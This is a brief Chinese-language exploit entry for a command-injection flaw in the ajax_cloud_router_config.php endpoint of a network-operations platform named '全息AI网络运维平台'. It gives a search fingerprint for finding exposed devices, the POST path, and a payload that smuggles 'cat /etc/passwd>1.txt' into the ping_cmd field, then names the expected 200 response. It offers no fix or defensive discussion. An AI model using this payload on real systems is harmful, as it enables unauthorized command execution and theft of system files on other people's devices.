# 全息AI网络运维平台ajax_cloud_router_config.php存在命令执行漏洞

全息AI网络运维平台 ｜ 命令执行 ｜ —
- **指纹**：`"全息AI网络运维平台"`
- **请求**：`POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1`

**Payload**
```
host：127.0.0.1
ping_cmd=8.8.8.8cat /etc/passwd>1.txt
```
- **响应特征**：200